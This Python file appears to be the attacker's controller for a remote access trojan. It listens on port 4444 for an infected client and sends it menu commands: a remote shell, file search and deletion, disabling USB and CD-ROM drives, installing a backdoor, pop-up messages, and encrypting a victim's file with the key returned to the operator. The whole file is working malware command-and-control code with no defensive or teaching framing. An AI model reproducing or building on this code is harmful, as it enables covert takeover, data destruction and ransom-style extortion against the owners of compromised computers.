from socket import *

s = socket(2,1)
s.bind(("127.0.0.1",4444))
s.listen(1)
print("Connected To Port")
print("______________________________\n")


client, addr = s.accept()
print("Connected To"+str(addr)+"\n")
print("______________________________")


    
data = input('''
    1-CMD
    2-Find Drive
    3-Find File
    4-Delete File
    5-Disable CDROM   
    6-Disable USB
    7-Backdoor
    8-Message Box
    9-Voice
    10-Encrypt File
    11-Decrypt File
    12-Log Out         
    13-Restart            
    14-Reboot

            
Enter your choice:''')

if data == "1":
    client.send((data).encode())
    while True:
        Command = input("Enter Your Command: ")
        if Command.upper() == "F":
            break
        client.send((Command).encode())
        new_data = client.recv(102456).decode()
        print(new_data)

elif data == "2":
    File = open("Drive List.txt", "w")
    client.send((data).encode())
    new_data = client.recv(1024).decode()
    File.write(new_data)
    File.close()

elif data == "3":
    F = open("File.txt", "a")
    File = input("Enter Your File_Name(Example File.txt): ")
    client.send((data+File).encode())
    new_data = client.recv(1024).decode()
    F.write(new_data)
    F.close()

elif data == "4":
    F = open("Delete_File Result.txt", "w")
    File = input("Enter Your File_Name(Example File.txt): ")
    client.send((data+File).encode())
    new_data = client.recv(1024).decode()
    F.write(new_data)
    F.close()

elif data == "5":
    F = open("Disable_CDROM Result.txt", "w")
    client.send((data).encode())
    new_data = client.recv(1024).decode()
    F.write(new_data)
    F.close()

elif data == "6":
    F = open("Disable_USB Result.txt", "w")
    client.send((data).encode())
    new_data = client.recv(1024).decode()
    F.write(new_data)
    F.close()

elif data == "7":
    F = open("Backdoor Result.txt", "w")
    client.send((data).encode())
    new_data = client.recv(1024).decode()
    F.write(new_data)
    F.close()

elif data == "8":
    F = open("Message_Box Result.txt", "w")
    msg = input("Enter Your Message: ")
    client.send((data+msg).encode())
    new_data = client.recv(1024).decode()
    F.write(new_data)
    F.close()

elif data == "9":
    F = open("Voice Result.txt", "w")
    msg = input("Enter Your Message: ")
    client.send((data+msg).encode())
    new_data = client.recv(1024).decode()
    F.write(new_data)
    F.close()

elif data == "10":
    F = open("Key.txt", "w")
    Path = input("Enter the file path(You can get the file path from item 3): ")
    client.send((data+Path).encode())

    key = client.recv(1024).decode()
    F.write(key)
    F.close()

elif data == "11":
    Path = input("Enter the encrypt file path(You can get the file path from item 3): ")
    key = input("Enter key: ")
    client.send((data+Path).encode())
    client.send(key.encode())
            

elif data == "12":
    client.send(data.encode())

elif data == "13":
    client.send(data.encode())

elif data == "14":
    client.send(data.encode())


    

        
        
        
    
    
    
